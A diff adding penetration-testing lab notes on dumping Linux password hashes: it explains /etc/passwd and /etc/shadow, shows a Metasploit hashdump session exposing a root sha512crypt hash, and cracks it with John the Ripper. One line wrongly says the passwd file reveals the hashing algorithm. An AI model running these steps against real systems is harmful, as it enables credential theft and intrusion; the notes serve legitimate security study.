@@ -2890,15 +2890,62 @@ root
 
 #### Dumping Linux Password Hashes    
 
+- Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.
+- All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd
+- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.
+- All the encrypted passwords for the users are stored in the shadow file. it can be found in the following directory: /etc/shadow
+- The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.
+- The passwd file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).
 
 
 
+ **get linux hashes using metasploit `post/linux/gather/hashdump`**
+
+```bash
+msf5 > use post/linux/gather/hashdump
+msf5 post(linux/gather/hashdump) > options
+
+Module options (post/linux/gather/hashdump):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(linux/gather/hashdump) > set session 1
+session => 1
+msf5 post(linux/gather/hashdump) > run
+
+[!] SESSION may not be compatible with this module.
+[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
+[+] Unshadowed Password File: /root/.msf4/loot/20240127161035_default_192.184.92.3_linux.hashes_609357.txt
+[*] Post module execution completed
+```
 
 
 
+**crack hashes with john the ripper**
+
+```bash
+root@attackdefense:~# cat roothash.txt
+root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
+
+root@attackdefense:~# john --wordlist=/usr/share/wordlists/rockyou.txt roothash.txt
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 48 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 1 candidate left, minimum 192 needed for performance.
+password         (root)			<<<<<<<============
+1g 0:00:00:00 DONE (2024-01-27 16:27) 1.428g/s 1.428p/s 1.428c/s 1.428C/s password
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
 
 
 
+---
 
 
 
